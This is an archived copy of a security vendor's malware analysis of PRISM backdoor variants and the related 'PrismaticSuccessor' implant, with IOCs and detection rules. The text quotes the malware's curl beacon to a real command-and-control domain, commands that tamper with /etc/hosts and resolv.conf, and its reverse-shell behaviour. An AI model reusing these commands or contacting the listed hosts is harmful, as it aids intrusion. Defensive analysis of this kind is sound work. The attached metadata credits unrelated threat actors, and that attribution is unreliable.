{
    "id": "9078dbf2-9346-4386-8222-30ecd17f35b0",
    "created_at": "2023-01-12T15:10:33.539802Z",
    "updated_at": "2025-03-27T02:06:13.342387Z",
    "deleted_at": null,
    "sha1_hash": "bad66c94af4f1a2bc7f5b62367a71f7e4e2d2852",
    "title": "2021-08-23 - PRISM attacks fly under the radar",
    "authors": "",
    "file_creation_date": "2022-05-27T23:23:26Z",
    "file_modification_date": "2022-05-27T23:23:26Z",
    "file_size": 1812238,
    "plain_text": "# PRISM attacks fly under the radar\n\n**[cybersecurity.att.com/blogs/labs-research/prism-attacks-fly-under-the-radar](https://cybersecurity.att.com/blogs/labs-research/prism-attacks-fly-under-the-radar)**\n\n[1. AT&T Cybersecurity](https://cybersecurity.att.com/)\n[2. Blog](https://cybersecurity.att.com/blogs)\n\nAugust 23, 2021 | [Fernando Dominguez](https://cybersecurity.att.com/blogs/author/fernando-dominguez)\n\n## Executive summary\n\n[AT&T Alien Labs has recently discovered a cluster of Linux ELF executables that have low or](https://cybersecurity.att.com/alien-labs)\nzero anti-virus detections in VirusTotal (see example in figure 1), though our internal threat\nanalysis systems have flagged them as malicious. Upon inspection of the samples, Alien\nLabs has identified them as modifications of the open-source PRISM backdoor used by\nmultiple threat actors in various campaigns.\n\nWe have conducted further investigation of the samples and discovered that several\ncampaigns using these malicious executables have managed to remain active and under the\nradar for more than 3.5 years. The oldest samples Alien Labs can attribute to one of the\nactors date from the 8th of November, 2017.\n\n\n-----\n\nFigure 1. PRISM sample marked as clean in VirusTotal, as captured by Alien Labs.\n\n## Analysis\n\n**WaterDrop**\n\nThe WaterDrop variant is easily identifiable as it includes a function named xencrypt which\nperforms XOR encryption with the hard-coded single-byte 0x1F key. Starting in version 7 of\nthe WaterDrop variant, samples include the plain-text string “WaterDropx vX started”, where\nX is the integer version number. So far, we have observed versions 1, 2.2, and 3 still using\nthe name PRISM. Versions 7, 9, and 12 are named WaterDropx.\n\nIt also uses the easily identifiable User Agent string “agent-waterdropx” for the HTTP-based\ncommand and control (C&C) communications, and it reaches to subdomains of the\nwaterdropx[.]com domain.\n\nWhile all these may seem to be fairly obvious indicators, the threat actor behind this variant\nhas managed to maintain a zero or almost-zero detection score in VirusTotal for its samples\nand domains. This is most likely due to their campaigns being fairly small in size. The\nwaterdropx[.]com domain was registered to the current owner on August 18, 2017, and as of\nAugust 10, 2021, it was still online.\n\nBesides the base PRISM features, WaterDrop introduces XOR encryption for the\nconfiguration and an additional process that regularly queries the C&C for commands to\nexecute (see figure 2).\n\n\n-----\n\nFigure 2. Function to query C&C for commands\n\n\n-----\n\nThis communication with the C&C server is plain-text HTTP, and it is performed via the curl\ncommand. In all the versions Alien Labs has observed, the option -A “agent-waterdropx” is\nused, meaning the User Agent header will remain constant across versions.\n\nWe have also observed some samples of this variant that load a Kernel Module if the\nprocess is executed with root privileges (see figure 3).\n\nFigure 3. Installing the waterdrop.ko Kernel Module\n\n### Version evolution\n\n**PRISM v1**\n\nAlien Labs has found samples tagged as “PRISM v1” that we can attribute to the same threat\nactor with high confidence as they use the same C&C domain (waterdropx[.]com). The\nsamples also share distinctive features such as the agent-waterdropx User Agent string.\n\nCompared to the public PRISM, this version introduces the creation of a child process that\nconstantly queries the C&C server for commands to execute. The initial request to the C&C\nserver is performed by the following command:\n\n\n-----\n\n```\ncurl A agent waterdropx http://r.waterdropx[.]com:13858/tellmev2.x?v 1&act touch\n\n```\nPRISM v1 does not feature any kind of obfuscation, packing, or encryption of the binaries.\n\n**PRISM v2.2**\n\nPRISM v2.2 introduces the usage of XOR encryption to obfuscate sensitive data, such as\nthe BASH command strings used. The key is a single byte, and it is hard coded to the 0x1F\nvalue. This particular key is used across all the samples from this threat actor we observed.\n\nFor this version, the initial C&C URI request format is:\n```\n/tellmev2.x?v=2.2&act=touch\n\n```\n**PRISM v3**\n\nPRISM v3 is identical to v2.2, with one exception: clients include a bot id for identification\npurposes. This bot id is saved to /etc/.xid and used in the malware beacon (see figure 4).\n\nFigure 4. Usage of bot id\n\nThe initial request format is:\n\n\n-----\n\n```\n/tellmev2.x?v 3&act touch&xid\n\n```\n**Waterdrop v7**\n\nWaterdrop v7 introduces the use of a Kernel Module that is installed using insmod if the\nprocess has root privileges. The code responsible for this task can be seen in Figure 3. We\nhave not yet been able to retrieve the Kernel Module for analysis. Therefore, we are not able\nto determine the purpose of this payload.\n\nThe rest of the code is identical to PRISM v3, only changing the hard-coded version value.\n\nAs such, the initial request format is:\n```\n/tellmev2.x?v=7&act=touch&xid=\n\n```\n**Waterdrop v9**\n\nContinuing the trend of previous versions, the changes on Waterdrop v9 are minimal. The\nonly change found in this version is that instead of using a hard-coded ICMP password, the\nbot uses its own bot id as ICMP password to spawn reverse shells.\n\nThe initial request format is:\n```\n/tellmev2.x?v=9&act=touch&xid=\n\n```\n**Waterdrop v12**\n\nWaterdrop v12 is almost identical to its predecessors, with an enhancement to the backdoor\nstability. As such, the initial request format is:\n```\n/tellmev2.x?v=12&act=touch&xid=\n\n## AT&T Alien Labs discovers malware family “PrismaticSuccessor”\n\n```\nAlien Labs began its research investigating the z0gg[.]me domain. Said domain resolves to\nan IP address that is shared by another twelve domains (see figure 5).\n\n\n-----\n\nFigure 5. Domain overlaps for target address\n\nSome of the overlapping domains are known PRISM C&C domains, however, z0gg[.]me is\n[contacted by several samples that also reach out to github.com. Particularly, samples were](https://otx.alienvault.com/indicator/domain/z0gg.me)\nobserved contacting the “https://github.com/lirongchun/i” repository.\n\nIn this repository we can observe the following files.\n\nThree documents containing an IP address (README.md) and a port number\n(README1.md and MP.md).\nA bash script for dirty cow (CVE-2016-5195) exploitation, named “111.”\n\nSeveral ELF binaries, including:\n\ngit: A custom malware implant\n[ass: The open-source security tool named “hide my ass” compiled for the x64](https://github.com/gopherst/hidemyass)\narchitecture\nass32: The open-source security tool named “hide my ass” compiled for the x86\narchitecture\n\nAs the actor is using a public git repository to host its malware and infrastructure information,\nwe can obtain the historical data and see its evolution.\n\nFor example, we can gather all the IP addresses that the actor has used as C&C servers\nwith the following command:\n\n\n-----\n\n```\n$ git log p README.md |grep + |grep v +++ \n+45.199.88[.]86\n+154.48.227[.]27\n+207.148.118[.]141\n+154.48.227[.]27\n+165.22.136[.]80\n+154.48.227[.]27\n+156.236.110[.]79\n+43.230.11[.]125\n+172.247.127[.]136\n+127.0.0[.1]\n+192.168.3[.]173\n+192.168.3[.]173:80\n+192.168.3[.]173\n+118.107.180[.]8\n+s.rammus[.]me\n+s.rammus[.]me:80\n+192.168.3[.]150:80\n+192.168.3[.]150^80\n+192.168.3[.]150^\n+^192.168.3[.]150\n+^192.168.3[.]133\nIt is also notable that the malware implant has received several updates over time.\nWe can pull all the binaries uploaded to the repository that are not open-source\nsecurity tools, as listed here:\n1.1M    MP.out\n15K     git\n15K     git (1)\n15K     git (2)\n\n```\n\n-----\n\n```\n16K     git (3)\n1.1M    git (4)\n1.1M    git (5)\n15K     git443\n16K     git53\n1.1M    gitest\n11K     hostname\n12K     ps\n10K     wm\n12K     wm (1)\n14K     wm32\n15K     wmgithub\n$ shasum -a 256 *\n933b4c6c48f82bbb62c9b1a430c7e758b88c03800c866b36c2da2a5f72c93657 MP.out\nf19043c7b06db60c8dd9ff55636f9d43b8b0145dffe4c6d33c14362619d10188 git\neeabee866fd295652dd3ddbc7552a14953d91b455ebfed02d1ccdee6c855718d git (1)\n3a4998bb2ea9f4cd2810643cb2c1dae290e4fe78e1d58582b6f49b232a58575a git (2)\n3366676681a31feadecfe7d0f5db61c4d6085f5081b2d464b6fe9b63750d4cd8 git (3)\ncc3752cc2cdd595bfed492a2f108932c5ac28110f5f0d30de8681bd10316b824 git (4)\nbaf2fa00711120fa43df80b8a043ecc0ad26edd2c5d966007fcd3ffeb2820531 git (5)\neb64ee2b6fc52c2c2211018875e30ae8e413e559bcced146af9aa84620e3312f git443\nd1d65b9d3711871d8f7ad1541cfbb7fa35ecc1df330699b75dd3c1403c754278 git53\n77ddc6be62724ca57ff45003c5d855df5ff2b234190290545b064ee4e1145f63 gitest\n1de9232f0bec9bd3932ae3a7a834c741c4c378a2350b4bbb491a102362235017 hostname\n7ed15e59a094ca0f9ccac4c02865172ad67dcfc5335066f67fe3f11f68dd7473 ps\n1eb6973f70075ede421bed604d7642fc844c5a47c53d0fb7a9ddb21b0bb2519a wm\n\n```\n\n-----\n\n```\n6f983303bb82d8cc9e1ebf8c6c1eb7c17877debc66cd1ac7c9f78b24148a4e46 wm (1)\ne4fe57d9d2c78a097f38cba7a9aad7ca53da24ecbcad0c1e00f21d34d8a82de4 wm32\nb08d48cc12c6afa5821a069bd6895175d5db4b5a9dde4e04d587c3dec68b1920 wmgithub\n\n```\nGrouping them by size we observed two different clusters: 1) one containing samples that\nare around 15K and 2) ones that are around 1.1MB. After a quick triage, we assessed that\nthe light-weight binaries are standard PRISM backdoors, while the bigger sized binaries\nbelong to another malware family. Given the git’s history, we were able to observe how the\nactor started using the PRISM backdoor for their operative, and then on July 16, 2019,\nswitched to the custom implant in commit 6055e31cc87679a7198e1143d1eddcdfc9313816.\nIt is also notable that this custom implant’s binaries are packed using a modified version of\nUPX.\n\nThe following binary analysis of said custom implants uses sample with SHA256\naaeee0e6f7623f0087144e6e318441352fef4000e7a8dd84b74907742c244ff5 as a reference.\n\nFigure 6. Detection evolution for analyzed sample\n\nThe binaries from this particular malware family are quite large in size (1-3 MB compared to\nthe ~15KB of the typical PRISM binary). This is due to the binaries having libcurl statically\ncompiled into them, which is evident due to the presence of known libcurl strings. We have\nnamed this malware family “PrismaticSuccessor.”\n\nBy decompiling the main function, Alien Labs observed that the binary takes an optional\nparameter. If said parameter is the character “9,” it prints the configuration. For these\nbinaries, the configuration consists of two URLs: 1) HostUrl is used to fetch the C&C host\nand 2) PortUrl is used to fetch the port number to contact the previous host on.\n\n\n-----\n\nWe have also observed that immediately after these actions, the malware attempts to open\nand lock /var/lock/sshd.lock. If it fails to do so, it fakes a segmentation fault. This procedure\nensures that the malware is not already running in the machine (see figure 7).\n\nFigure 7. Configuration and lock check\n\nNext, the malware decrypts a string containing a process name, which is used to overwrite\n“argv”. This technique avoids using prctl. The possible command line arguments are also\nsmashed and replaced by the whitespace character (see figure 8).\n\nFigure 8. Argv smashing\n\nNote that the aMcwfkvf variable contains the “[mcwfkvf]” value, which is decrypted to\n“[kauditd]” in “src.” The decryption routine is ROT13 with -2 as key. This particular ROT13\nonly rotates lower- and upper-case letters, not symbols or numbers (see figure 9).\n\n\n-----\n\nFigure 9. ROT13 implementation\n\nThe above actions conclude the environment setup process for the malware. Next, the\nmalicious activity begins, which includes spawning child processes, so the malware can\nmultitask. This also makes it harder to trace the malware (see figure 10).\n\n\n-----\n\nFigure 10. Malicious activity loop\n\nSpawning child processes:\n\nThe first fork terminates the parent and only lets the child continue – the first-order child.\n\nFirst-Order Child. This first-order child will fork again, spawning a second order child. The\nfirst order child will execute the “While” loop body endlessly, spawning three additional child\nprocesses (third-order childs). The second order child will contact the fallback C&C server.\n\nSecond-Order Child. The second-order child will open a reverse shell session to a fallback\nhard-coded C&C server. The sample ships with up to three C&C addresses, encrypted with\nROT13. These addresses attempt to resolve via gethostbyname. The first one that resolves\nsuccessfully is contacted on TCP port 80. For this particular sample, the secondary C&C\naddress list is “z0gg.me”, “x63.in” and “x47.in.” (See figure 11.)\n\nFigure 11. ROT13 encrypted C&C list\n\nThe server is also required to reply with a password in order for the reverse shell to be\nsuccessfully established. However, the required password is not shipped in the binary.\nInstead, the malware calculates the MD5 hash of the replied buffer and compares it to the\nhard-coded value “ef4a85e8fcba5b1dc95adaa256c5b482”.\n\n\n-----\n\nThis communication is performed whether the primary C&C server is successfully contacted\nor not. The primary C&C server does not include a password mechanism. (See figure 12.)_\n\nFigure 12. Secondary command and control server contact\n\n\n-----\n\nThe first of the third-order child processes gets the C&C host and port from github and opens\na reverse shell to the IP:PORT indicated in those URLs (see figure 13 and 14).\n\nFigure 13. Obtaining C&C host from github\n\nFigure 14. Obtaining C&C port from github\n\nThe function to spawn a shell to a host is very similar to the one found in PRISM’s source\ncode, if not identical (see figure 15 and 16).\n\n\n-----\n\nFigure 15. Spawning a shell session to C&C\n\n\n-----\n\nFigure 16. PRISM function to spawn the reverse shell session\n\nIf it fails to spawn the shell, the child dies and the whole process will be reattempted in 15\nseconds.\n\nThe other two third-order child processes jump to shellcode routines. These routines are\nencrypted with a hard-coded 8-byte XOR key and include a small self-decrypting stub (see\nfigures 17 and 18).\n\n\n-----\n\nFigure 17. First shellcode routine\n\nEach of these routines build a command in the stack and launch it. For the analyzed sample\nthe commands were /bin/sh -c sed -i \"/\\\\(z0gg.me\\\\|x63.in\\\\)/d\" /etc/hosts and /bin/sh -c \"grep\n-q 'nameserver 8.8.8.8' /etc/resolv.conf||echo 'nameserver 8.8.8.8' >> /etc/resolv.conf\". (See\nfigure 18.)\n\nFigure 18. Emulated stack with example command string\n\nWhen Alien Labs searched for the obtained command lines, we got an interesting result in\nStackOverflow where a user complains about a suspicious process in their machine. This\nindicates that the threat is being used in the wild.\n\n## Other variants\n\nWe have observed other actors using the PRISM backdoor for their operations. However, in\nthe majority of these cases, the actor(s) use the original PRISM backdoor as is, without\nperforming any major modifications. This fact, combined with the open-source nature of the\nbackdoor, impedes us from properly tracking the actor(s) activity.\n\n## Conclusion\n\n\n-----\n\nPRISM is an open-source simplistic and straightforward backdoor. Its traffic is clearly\nidentifiable and its binaries are easy to detect. Despite this, PRISM’s binaries have been\nundetected until now, and its C&C server has remained online for more than 3.5 years. This\nshows that while bigger campaigns that receive more attention are usually detected within\nhours, smaller ones can slip through.\n\nAlien Labs expects the adversaries to remain active and conduct operations with this toolset\nand infrastructure. We will continue to monitor and report any noteworthy findings.\n\n## Detection methods\n\nThe following associated detection methods are in use by Alien Labs. They can be used by\nreaders to tune or deploy detections in their own environments or for aiding additional\nresearch.\n\n\nSURICATA IDS SIGNATURES\n\n```\nalert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"AV TROJAN WaterDropX CnC\nBeacon\"; flow:established,to_server; content:\"GET\"; http_method; content:\"v=\";\nhttp_uri; content:\"act=\"; http_uri; content:\"agent-waterdropx\"; http_user_agent;\nstartswith; endswith; reference:md5,5b714b1eb765493f2ff77e068a7c1a4f;\nclasstype:trojan-activity; sid:4002615; rev:1;)\n\n```\n\nOSQUERY QUERIES\n\n```\nSELECT path as file_name, directory as file_path, uid as source_userid, gid as\nuser_group_id, 'WaterDropx backdoor' as malware_family from file WHERE path =\n'/etc/.xid';\n\n```\n\nYARA RULES\n\n```\nrule PRISM {\n  meta:\n    author = \"AlienLabs\"\n    description = \"PRISM backdoor\"\n    reference = \"https://github.com/andreafabrizi/prism/blob/master/prism.c\"\n\n```\n\n-----\n\n```\n  strings:\n    $s1 = \"I'm not root :(\"\n    $s2 = \"Flush Iptables:\\t\"\n    $s3 = \" Version:\\t\\t%s\\n\"\n    $s4 = \" Shell:\\t\\t\\t%s\\n\"\n    $s5 = \" Process name:\\t\\t%s\\n\"\n    $s6 = \"iptables -F 2> /dev/null\"\n    $s7 = \"iptables -P INPUT ACCEPT 2> /dev/null\"\n    $s8 = \" started\\n\\n# \"\n    $c1 = {\n      E8 [4] 8B 45 ?? BE 00 00 00 00 89 C7 E8 [4] 8B 45 ?? BE 01 00 00 00\n      89 C7 E8 [4] 8B 45 ?? BE 02 00 00 00 89 C7 E8 [4] BA 00 00 00 00\n      BE [4] BF [4] B8 00 00 00 00 E8\n    }\n    $c2 = {\n      BA 00 00 00 00\n      BE 01 00 00 00\n      BF 02 00 00 00\n      E8 [4]\n      89 45 [1]\n      83 ?? ?? 00\n    }\n  condition:\n    uint32(0) == 0x464C457F and\n    filesize < 30KB and\n    (4 of ($s*) or all of ($c*))\n}\nrule PrismaticSuccessor : LinuxMalware\n{\n\n```\n\n-----\n\n```\n  meta:\n    author = \"AlienLabs\"\n    description = \"Prismatic Successor malware backdoor\"\n    reference =\n\"aaeee0e6f7623f0087144e6e318441352fef4000e7a8dd84b74907742c244ff5\"\n    copyright = \"Alienvault Inc. 2021\"\n  strings:\n    $s1 = \"echo -e \\\"\"\n    $s2 = \"[\\x1B[32m+\\x1B[0m]`/bin/hostname`\"\n    $s3 = \"[\\x1B[32m+\\x1B[0m]`/usr/bin/id`\"\n    $s4 = \"[\\x1B[32m+\\x1B[0m]`uname -r`\"\n    $s5 = \"[+]HostUrl->\\t%s\\n\"\n    $s6 = \"[+]PortUrl->\\t%s\\n\"\n    $s7 = \"/var/run/sshd.lock\"\n    $shellcode = {\n      48 31 C9\n      48 81 E9 [4]\n      48 8D 05 [4]\n      48 BB [8]\n      48 31 [2]\n      48 2D [2-4]\n      E2 F4\n    }\n    $c1 = {\n      8B 45 ??\n      BE 00 00 00 00\n      89 C7\n      E8 [4]\n      8B 45 ??\n      BE 01 00 00 00\n\n```\n\n-----\n\n```\n      89 C7\n      E8 [4]\n      8B 45 ??\n      BE 02 00 00 00\n      89 C7\n      E8 [4]\n      8B 45 ??\n      BA [4]\n      BE [4]\n      89 C7\n      E8\n    }\n  condition:\n    uint32(0) == 0x464C457F and\n    filesize > 500KB and filesize < 5MB and\n    5 of ($s*) and\n    all of ($c*) and\n    #shellcode == 2\n }\n\n## Associated indicators (IOCs)\n\n```\nThe following technical indicators are associated with the reported intelligence. A list of\n[indicators is also available in the OTX Pulse. Please note, the pulse may include other](https://otx.alienvault.com/pulse/60c31c4e4978e9721446c121)\nactivities related but out of the scope of the report.\n\nTYPE INDICATOR DESCRIPTION\n\n```\nSHA25\n6\n\n```\n```\n05fc4dcce9e9e1e627ebf051a190bd1f73bc83d876c78c6b3d86fc97b0d\nfd8e8\n\n```\n```\nPRISM v0.5\n\n```\n\n-----\n\n```\nSHA25\n6\n\n```\n```\n0af3e44967fb1b8e0f5026deb39852d4a13b117ee19986df5239f897914\nd9212\n\n```\n```\nPRISM v0.5\n\n```\n```\nSHA25\n6\n\n```\n```\n0f42b737e30e35818bbf8bd6e58fae980445f297034d4e07a7e62a606d2\n19af8\n\n```\n```\nTiger0.5\n\n```\n```\nSHA25\n6\n\n```\n```\n0fba35856fadad942a59a90fc60784e6cceb1d8002af96d6cdf8e8c3533\n025f7\n\n```\n```\nPRISM v0.5\n(stripped\ndown)\n\n```\n```\nSHA25\n6\n\n```\n```\n342e7a720a738bf8dbd4e5689cad6ba6a4fc6dd6808512cb4eb294fb3ec\nf61cd\n\n```\n```\nPRISM v0.5\n(stripped\ndown)\n\n```\n```\nSHA25\n6\n\n```\n```\n3a3c701e282b7934017dadc33d95e0cc57e43a124f14d852f39c2657e00\n81683\n\n```\n```\nPRISM v0.5\n(stripped\ndown)\n\n```\n```\nSHA25\n6\n\n```\n```\n5999c1a4a281a853378680f20f6133e53c7f6d0167445b968eb49b844f3\n7eab5\n\n```\n```\nPRISM v0.5\n\n```\n```\nSHA25\n6\n\n```\n```\n98fe5ed342da2b5a9d206e54b5234cfeeed35cf74b60d48eb0ef3dd1d7d\n7bd59\n\n```\n```\nPRISM v1\n\n```\n```\nSHA25\n6\n\n```\n```\na8c68661d1632f3a55ff9b7294d7464cc2f3ece63a782c962f1dc43f0f9\n68e33\n\n```\n```\nUdevd v1.0\n\n```\n```\nSHA25\n6\n\n```\n```\naf55b76d6c3c1f8368ddd3f9b40d1b6be50a2b97b25985d2dde1288ceab\n9ff24\n\n```\n```\nPRISM v0.5\n(stripped\ndown)\n\n```\n```\nSHA25\n6\n\n```\n```\nb6844ca4d1d7c07ed349f839c861c940085f1a30bbc3fc4aad0b496e8d4\n92ce0\n\n```\n```\nWaterDropx v12\n\n```\n```\nSHA25\n6\n\n```\n```\nb8215cafbea9c61df8835a3d52c40f9d2c6a37604dd329ef784e9d92bad\n1f30f\n\n```\n```\nPRISM v0.5\n\n```\n\n-----\n\n```\nSHA25\n6\n\n```\n```\nb8cceb317a5d2febcd60318c1652af61cd3d4062902820e79a9fb9a4717\nf7ba2\n\n```\n```\nPRISM v0.5\n\n```\n```\nSHA25\n6\n\n```\n```\nbe7ec385e076c1c1f676d75e99148f05e754ef5b189e006fb53016ce9ae\nf59e0\n\n```\n```\nPRISM v0.5\n(stripped\ndown)\n\n```\n```\nSHA25\n6\n\n```\n```\nc679600b75c6e84b53f4e6e21f3acbec1621c38940c8f3756d0b027c7a0\n58d9c\n\n```\n```\nPRISM v0.5\n\n```\n```\nSHA25\n6\n\n```\n```\nc802fa50409edf26e551ee0d134180aa1467a4923c759a2d3204948e14a\n52f12\n\n```\n```\nPRISM v0.5\n\n```\n```\nSHA25\n6\n\n```\n```\nc8525243a68cba92521fb80a73136aaa19794b4772c35d6ecfec0f82eca\nd5207\n\n```\n```\nPRISM v0.5\n\n```\n```\nSHA25\n6\n\n```\n```\nd3fa1155810be25f9b9a889ee64f845fc6645b2b839451b59cfa77bbc47\n8531f\n\n```\n```\nWaterDropx v9\n\n```\n```\nSHA25\n6\n\n```\n```\ndd5f933598184426a626d261922e1e82cb009910c25447b174d46e9cac3\nd391a\n\n```\n```\nWaterDropx v7\n\n```\n```\nSHA25\n6\n\n```\n```\ne14d75ade6947141ac9b34f7f5743c14dbfb06f4dfb3089f82595d9b067\ne88c2\n\n```\n```\nPRISM v2.2\n\n```\n```\nSHA25\n6\n\n```\n```\nf126c4f8b4823954c3c69121b0632a0e2061ef13feb348eb81f634379d0\n11913\n\n```\n```\nPRISM v3\n\n```\n```\nDOMAI\nN\n\n```\n```\nSUBDO\nMAIN\n\n```\n```\n457467[.]com Command &\n                                     Control server\nzzz.457467[.]com Command &\n                                     Control server\n\n```\n\n-----\n\n```\nDOMAI\nN\n\n```\n```\nSUBDO\nMAIN\n\n```\n```\nSUBDO\nMAIN\n\n```\n```\nDOMAI\nN\n\n```\n```\nSUBDO\nMAIN\n\n```\n```\nDOMAI\nN\n\n```\n```\nSUBDO\nMAIN\n\n```\n```\nSUBDO\nMAIN\n\n```\n```\nrammus[.]me Command &\n                                     Control server\ns.rammus[.]me Command &\n                                     Control server\nsw.rammus[.]me Command &\n                                     Control server\nwa1a1[.]com Command &\n                                     Control server\nwww.wa1a1[.]com Command &\n                                     Control server\nwaterdropx[.]com Command &\n                                     Control server\nr.waterdropx[.]com Command &\n                                     Control server\nspmood222.mooo[.]com Command &\n                                     Control server\n\n```\n```\nSHA25\n6\n\n```\n```\n933b4c6c48f82bbb62c9b1a430c7e758b88c03800c866b36c2da2a5f72c\n93657\n\n```\n```\nPrismaticSucce\nssor (packed)\n\n```\n```\nSHA25\n6\n\n```\n```\naaeee0e6f7623f0087144e6e318441352fef4000e7a8dd84b74907742c2\n44ff5\n\n```\n```\nPrismaticSucce\nssor\n(unpacked)\n\n```\n```\nSHA25\n6\n\n```\n```\nbaf2fa00711120fa43df80b8a043ecc0ad26edd2c5d966007fcd3ffeb28\n20531\n\n```\n```\nPrismaticSucce\nssor (packed)\n\n```\n\n-----\n\n```\nSHA25\n6\n\n```\n```\nf19043c7b06db60c8dd9ff55636f9d43b8b0145dffe4c6d33c14362619d\n10188\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\neeabee866fd295652dd3ddbc7552a14953d91b455ebfed02d1ccdee6c85\n5718d\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\n3a4998bb2ea9f4cd2810643cb2c1dae290e4fe78e1d58582b6f49b232a5\n8575a\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\n3366676681a31feadecfe7d0f5db61c4d6085f5081b2d464b6fe9b63750\nd4cd8\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\ncc3752cc2cdd595bfed492a2f108932c5ac28110f5f0d30de8681bd1031\n6b824\n\n```\n```\nPrismaticSucce\nssor (packed)\n\n```\n```\nSHA25\n6\n\n```\n```\nbaf2fa00711120fa43df80b8a043ecc0ad26edd2c5d966007fcd3ffeb28\n20531\n\n```\n```\nPrismaticSucce\nssor (packed)\n\n```\n```\nSHA25\n6\n\n```\n```\neb64ee2b6fc52c2c2211018875e30ae8e413e559bcced146af9aa84620e\n3312f\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\nd1d65b9d3711871d8f7ad1541cfbb7fa35ecc1df330699b75dd3c1403c7\n54278\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\n77ddc6be62724ca57ff45003c5d855df5ff2b234190290545b064ee4e11\n45f63\n\n```\n```\nPrismaticSucce\nssor (packed)\n\n```\n```\nSHA25\n6\n\n```\n```\n1de9232f0bec9bd3932ae3a7a834c741c4c378a2350b4bbb491a1023622\n35017\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\n7ed15e59a094ca0f9ccac4c02865172ad67dcfc5335066f67fe3f11f68d\nd7473\n\n```\n```\nPRISM backdoor\n\n```\n\n-----\n\n```\nSHA25\n6\n\n```\n```\n1eb6973f70075ede421bed604d7642fc844c5a47c53d0fb7a9ddb21b0bb\n2519a\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\n6f983303bb82d8cc9e1ebf8c6c1eb7c17877debc66cd1ac7c9f78b24148\na4e46\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\ne4fe57d9d2c78a097f38cba7a9aad7ca53da24ecbcad0c1e00f21d34d8a\n82de4\n\n```\n```\nPRISM backdoor\n\n```\n```\nSHA25\n6\n\n```\n```\nb08d48cc12c6afa5821a069bd6895175d5db4b5a9dde4e04d587c3dec68\nb1920\n\n```\n```\nPRISM backdoor\n\n```\n```\nDOMAI\nN\n\n```\n```\nDOMAI\nN\n\n```\n```\nDOMAI\nN\n\n```\n```\nz0gg[.]me Command &\n                                     Control\nx63[.]in Command &\n                                     Control\nx47[.]in Command &\n                                     Control\n\n```\n```\n URL https://github.com/lirongchun/i/ Malicious git\n                                          repository\n IP 45.199.88[.]86 Command &\n                                          Control\n\n## Mapped to MITRE ATT&CK\n\n```\n[The findings of this report are mapped to the following MITRE ATT&CK Matrix techniques:](https://attack.mitre.org/)\n\nTA0010: Exfiltration\n\nT1041: Exfiltration Over C2 Channel\nTA0002: Execution\n\nT1059: Command and Scripting Interpreter\n\n\n-----\n\nTA0005: Defense Evasion\n\nT1027: Obfuscated Files or Information\nT1564: Hide Artifacts\nT1562: Impair Defenses\nT1014: Rootkit\nT1036: Masquerading\n\n### Share this with others\n\nTags: [malware,](https://cybersecurity.att.com/blogs/tag/malware) [malware research,](https://cybersecurity.att.com/blogs/tag/malware+research) [alienvault labs,](https://cybersecurity.att.com/blogs/tag/alienvault+labs) [prism](https://cybersecurity.att.com/blogs/tag/prism)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-23 - PRISM attacks fly under the radar.pdf"
    ],
    "report_names": [
        "2021-08-23 - PRISM attacks fly under the radar.pdf"
    ],
    "threat_actors": [
        {
            "id": "81bd7107-6b2d-45c9-9eea-1843d4b9b308",
            "created_at": "2022-10-25T15:50:23.320841Z",
            "updated_at": "2025-03-27T02:00:55.441723Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Gamaredon Group",
                "IRON TILDEN",
                "Primitive Bear",
                "ACTINIUM",
                "Armageddon",
                "Shuckworm",
                "DEV-0157",
                "Aqua Blizzard"
            ],
            "source_name": "MITRE:Gamaredon Group",
            "tools": [
                "QuietSieve",
                "Pteranodon",
                "PowerPunch"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d5156b55-5d7d-4fb2-836f-861d2e868147",
            "created_at": "2023-01-06T13:46:38.557326Z",
            "updated_at": "2025-03-27T02:00:02.861124Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Aqua Blizzard",
                "Actinium",
                "DEV-0157",
                "Blue Otso",
                "G0047",
                "PRIMITIVE BEAR",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder",
                "ACTINIUM",
                "BlueAlpha",
                "IRON TILDEN"
            ],
            "source_name": "MISPGALAXY:Gamaredon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "61940e18-8f90-4ecc-bc06-416c54bc60f9",
            "created_at": "2022-10-25T16:07:23.659529Z",
            "updated_at": "2025-03-27T02:02:09.912404Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Actinium",
                "Aqua Blizzard",
                "Armageddon",
                "Blue Otso",
                "BlueAlpha",
                "Callisto",
                "DEV-0157",
                "Iron Tilden",
                "Operation STEADY#URSA",
                "Primitive Bear",
                "SectorC08",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder"
            ],
            "source_name": "ETDA:Gamaredon Group",
            "tools": [
                "Aversome infector",
                "BoneSpy",
                "DessertDown",
                "DilongTrash",
                "DinoTrain",
                "EvilGnome",
                "FRAUDROP",
                "Gamaredon",
                "GammaDrop",
                "GammaLoad",
                "GammaSteel",
                "Gussdoor",
                "ObfuBerry",
                "ObfuMerry",
                "PlainGnome",
                "PowerPunch",
                "Pteranodon",
                "Pterodo",
                "QuietSieve",
                "Remote Manipulator System",
                "Resetter",
                "RuRAT",
                "SUBTLE-PAWS",
                "UltraVNC"
            ],
            "source_id": "ETDA",
